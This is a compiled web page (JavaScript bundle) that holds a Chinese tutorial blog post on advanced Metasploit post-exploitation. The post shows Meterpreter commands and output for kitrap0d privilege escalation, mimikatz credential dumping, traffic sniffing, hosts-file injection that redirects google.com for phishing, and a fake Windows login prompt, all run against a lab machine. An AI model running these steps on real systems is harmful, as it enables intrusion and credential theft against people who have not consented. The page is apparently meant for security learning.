import{i as e,r as t,s as n,t as r}from"./app-DRouFNlp.js";var i=JSON.parse(`{"path":"/md/hack/tools/2022-05-02-019-Metasploit%E9%AB%98%E7%BA%A7%E6%89%A9%E5%B1%95%E5%8A%9F%E8%83%BD.html","title":"Metasploit高级扩展功能","lang":"zh-CN","frontmatter":{"category":"binghe-code-hack","title":"Metasploit高级扩展功能","tagline":"by 冰河","tag":["hack","binghe-code-hack"],"excerpt":"Metasploit高级扩展功能","lock":"need"},"git":{"updatedTime":1777467059000,"contributors":[{"name":"binghe001","username":"binghe001","email":"“1028386804@qq.com”","commits":1,"url":"https://github.com/binghe001"}],"changelog":[{"hash":"b75b6e641e607b7f05676a6a564dbee261378911","time":1777467059000,"email":"“1028386804@qq.com”","author":"binghe001","message":"feature: 升级到vuepress2"}]},"filePathRelative":"md/hack/tools/2022-05-02-019-Metasploit高级扩展功能.md"}`),a={name:`2022-05-02-019-Metasploit高级扩展功能.md`};function o(r,i,a,o,s,c){return n(),t(`div`,null,[...i[0]||=[e(`<h1 id="metasploit高级扩展功能" tabindex="-1"><a class="header-anchor" href="#metasploit高级扩展功能"><span>Metasploit高级扩展功能</span></a></h1><h3 id="用metasploit提升权限" tabindex="-1"><a class="header-anchor" href="#用metasploit提升权限"><span>用Metasploit提升权限</span></a></h3><p>有时，在使用getsystem提权的时候会失败，此时，我们可以使用后渗透模块将控制权限级别提高至最高级别。这里，我们以Windows Server 2008 SP1操作系统为例，其中，使用本地渗透模块绕过了限制并获得了目标的完全管理权限。</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">meterpreter &gt; back</span>
<span class="line">msf5 &gt; use exploit/windows/local/ms10_015_kitrap0d </span>
<span class="line">msf5 exploit(windows/local/ms10_015_kitrap0d) &gt; set SESSION 3</span>
<span class="line">msf5 exploit(windows/local/ms10_015_kitrap0d) &gt; exploit</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这里，我们使用 exploit/windows/local/ms10_015_kitrap0d 模块提升了控制权限，并获得了最高级别的管理权限。</p><h3 id="使用mimikatz查找明文密码" tabindex="-1"><a class="header-anchor" href="#使用mimikatz查找明文密码"><span>使用mimikatz查找明文密码</span></a></h3><p>mimikatz可以直接从lsass服务获取Windows中状态为活跃的账号的明文密码。</p><p>可以在Metasploit中使用load mimikatz命令载入mimikatz模块，之后就可以使用mimikatz模块中的kerberos命令来查找密码。</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">meterpreter &gt; load mimikatz </span>
<span class="line">Loading extension mimikatz...Success.</span>
<span class="line">meterpreter &gt; kerberos </span>
<span class="line">[+] Running as SYSTEM</span>
<span class="line">[*] Retrieving kerberos credentials</span>
<span class="line">kerberos credentials</span>
<span class="line">====================</span>
<span class="line"></span>
<span class="line">AuthID   Package    Domain        User             Password</span>
<span class="line">------   -------    ------        ----             --------</span>
<span class="line">0;62769  NTLM       LIUYAZHUANG   lyz              </span>
<span class="line">0;997    Negotiate  NT AUTHORITY  LOCAL SERVICE    </span>
<span class="line">0;996    Negotiate  NT AUTHORITY  NETWORK SERVICE  </span>
<span class="line">0;52356  NTLM                                      </span>
<span class="line">0;999    NTLM       WORKGROUP     LIUYAZHUANG$     </span>
<span class="line"></span>
<span class="line">meterpreter &gt; </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这里，我删除了密码。</p><h3 id="使用metasploit进行流量嗅探" tabindex="-1"><a class="header-anchor" href="#使用metasploit进行流量嗅探"><span>使用Metasploit进行流量嗅探</span></a></h3><h4 id="使用sniffer模块" tabindex="-1"><a class="header-anchor" href="#使用sniffer模块"><span>使用sniffer模块</span></a></h4><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">meterpreter &gt; use sniffer </span>
<span class="line">Loading extension sniffer...Success.</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="列出目标主机上的所有网络接口" tabindex="-1"><a class="header-anchor" href="#列出目标主机上的所有网络接口"><span>列出目标主机上的所有网络接口</span></a></h4><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">meterpreter &gt; sniffer_interfaces </span>
<span class="line"></span>
<span class="line">1 - &#39;VMware Accelerated AMD PCNet Adapter&#39; ( type:0 mtu:1514 usable:true dhcp:true wifi:false )</span>
<span class="line"></span>
<span class="line">meterpreter &gt; </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="启动网络嗅探" tabindex="-1"><a class="header-anchor" href="#启动网络嗅探"><span>启动网络嗅探</span></a></h4><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">meterpreter &gt; sniffer_start</span>
<span class="line">[-] Usage: sniffer_start [interface-id] [packet-buffer (1-200000)] [bpf filter (posix meterpreter only)]</span>
<span class="line">meterpreter &gt; </span>
<span class="line">meterpreter &gt; sniffer_start 1 1000</span>
<span class="line">[*] Capture started on interface 1 (1000 packet buffer)</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>输入sniffer_start 1 1000命令启动网络接口上的嗅探功能，其中1表示网卡ID,1000是缓冲区的大小。</p><h4 id="下载pcap数据包" tabindex="-1"><a class="header-anchor" href="#下载pcap数据包"><span>下载pcap数据包</span></a></h4><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">meterpreter &gt; sniffer_dump </span>
<span class="line">[-] Usage: sniffer_dump [interface-id] [pcap-file]</span>
<span class="line">meterpreter &gt; sniffer_dump 1 1.pcap</span>
<span class="line">[*] Flushing packet capture buffer for interface 1...</span>
<span class="line">[*] Flushed 1000 packets (993284 bytes)</span>
<span class="line">[*] Downloaded 052% (524288/993284)...</span>
<span class="line">[*] Downloaded 100% (993284/993284)...</span>
<span class="line">[*] Download completed, converting to PCAP...</span>
<span class="line">[*] PCAP file written to 1.pcap</span>
<span class="line">meterpreter &gt;</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>此时，会把1.pcap下载到/root目录下(前提是用root账户登录的Kali)</p><h4 id="使用wireshark查看数据包" tabindex="-1"><a class="header-anchor" href="#使用wireshark查看数据包"><span>使用wireshark查看数据包</span></a></h4><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">root@binghe:~# wireshark 1.pcap </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="https://img-blog.csdnimg.cn/20190127203707765.png" alt="img"></p><h4 id="停止网络嗅探" tabindex="-1"><a class="header-anchor" href="#停止网络嗅探"><span>停止网络嗅探</span></a></h4><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">meterpreter &gt; sniffer_stop</span>
<span class="line">[-] Usage: sniffer_stop [interface-id]</span>
<span class="line">meterpreter &gt; </span>
<span class="line">meterpreter &gt; sniffer_stop 1</span>
<span class="line">[*] Capture stopped on interface 1</span>
<span class="line">[*] There are 74 packets (14485 bytes) remaining</span>
<span class="line">[*] Download or release them using &#39;sniffer_dump&#39; or &#39;sniffer_release&#39;</span>
<span class="line">meterpreter &gt; </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="使用metasploit对host文件进行注入" tabindex="-1"><a class="header-anchor" href="#使用metasploit对host文件进行注入"><span>使用Metasploit对host文件进行注入</span></a></h3><p>可以通过对目标主机的host文件进行注入展开钓鱼攻击——将制定域名的条目添加到目标主机的host文件中。</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">meterpreter &gt; background</span>
<span class="line">[*] Backgrounding session 2...</span>
<span class="line">msf5 exploit(windows/http/rejetto_hfs_exec) &gt; sessions -i</span>
<span class="line"></span>
<span class="line">Active sessions</span>
<span class="line">===============</span>
<span class="line"></span>
<span class="line">  Id  Name  Type                     Information                        Connection</span>
<span class="line">  --  ----  ----                     -----------                        ----------</span>
<span class="line">  2         meterpreter x86/windows  NT AUTHORITY\\SYSTEM @ LIUYAZHUANG  192.168.175.128:4444 -&gt; 192.168.175.130:1056 (192.168.175.130)</span>
<span class="line"></span>
<span class="line">msf5 exploit(windows/http/rejetto_hfs_exec) &gt; use post/windows/manage/inject_host </span>
<span class="line">msf5 post(windows/manage/inject_host) &gt; show options</span>
<span class="line"></span>
<span class="line">Module options (post/windows/manage/inject_host):</span>
<span class="line"></span>
<span class="line">   Name     Current Setting  Required  Description</span>
<span class="line">   ----     ---------------  --------  -----------</span>
<span class="line">   DOMAIN                    yes       Domain name for host file manipulation.</span>
<span class="line">   IP                        yes       IP address to point domain name to.</span>
<span class="line">   SESSION                   yes       The session to run this module on.</span>
<span class="line"></span>
<span class="line">msf5 post(windows/manage/inject_host) &gt; set IP 192.168.175.128</span>
<span class="line">IP =&gt; 192.168.175.128</span>
<span class="line">msf5 post(windows/manage/inject_host) &gt; set DOMAIN www.google.com</span>
<span class="line">DOMAIN =&gt; www.google.com</span>
<span class="line">msf5 post(windows/manage/inject_host) &gt; set SESSION 2</span>
<span class="line">SESSION =&gt; 2</span>
<span class="line">msf5 post(windows/manage/inject_host) &gt; exploit</span>
<span class="line"></span>
<span class="line">[*] Inserting hosts file entry pointing www.google.com to 192.168.175.128..</span>
<span class="line">[+] Done!</span>
<span class="line">[*] Post module execution completed</span>
<span class="line">msf5 post(windows/manage/inject_host) &gt; </span>
<span class="line">msf5 post(windows/manage/inject_host) &gt; sessions</span>
<span class="line"></span>
<span class="line">Active sessions</span>
<span class="line">===============</span>
<span class="line"></span>
<span class="line">  Id  Name  Type                     Information                        Connection</span>
<span class="line">  --  ----  ----                     -----------                        ----------</span>
<span class="line">  2         meterpreter x86/windows  NT AUTHORITY\\SYSTEM @ LIUYAZHUANG  192.168.175.128:4444 -&gt; 192.168.175.130:1056 (192.168.175.130)</span>
<span class="line"></span>
<span class="line">msf5 post(windows/manage/inject_host) &gt; </span>
<span class="line">msf5 post(windows/manage/inject_host) &gt; </span>
<span class="line">msf5 post(windows/manage/inject_host) &gt; sessions -i 2</span>
<span class="line">[*] Starting interaction with 2...</span>
<span class="line"></span>
<span class="line">meterpreter &gt; </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>此时，在目标机的C:/Windows/System32/drivers/etc/hosts文件中多了一行</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">192.168.175.128 www.google.com</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>如下图所示：</p><p><img src="https://img-blog.csdnimg.cn/20190127203850282.png" alt="img"></p><p>此时，在目标机上访问http://www.google.com/，结果如下图：</p><p><img src="https://img-blog.csdnimg.cn/20190127203929154.png" alt="img"></p><p>访问的是我们在Kali上配置的页面。</p><h3 id="登录密码的钓鱼窗口" tabindex="-1"><a class="header-anchor" href="#登录密码的钓鱼窗口"><span>登录密码的钓鱼窗口</span></a></h3><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">meterpreter &gt; run post/windows/gather/phish_windows_credentials </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>此时，会在目标主机上弹出外观和Windows系统认证弹窗一样的窗口，这个窗口要求受害者必须输入正确的用户名和密码后才能继续正常工作。</p><p>如下图所示：</p><p><img src="https://img-blog.csdnimg.cn/20190127204015499.png" alt="img"></p><p>当用户输入了正确的用户名和密码之后，就会在我们的命令行中显示出来，如下图所示：</p><p><img src="https://img-blog.csdnimg.cn/20190127204106537.png" alt="img"></p><h2 id="写在最后" tabindex="-1"><a class="header-anchor" href="#写在最后"><span>写在最后</span></a></h2><blockquote><p>如果你觉得冰河写的还不错，请微信搜索并关注「 <strong>冰河技术</strong> 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 <strong>冰河技术</strong> 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 <strong>冰河技术</strong> 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 <strong>冰河技术</strong> 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200906013715889.png" alt=""></p>`,46)]])}var s=r(a,[[`render`,o]]);export{i as _pageData,s as default};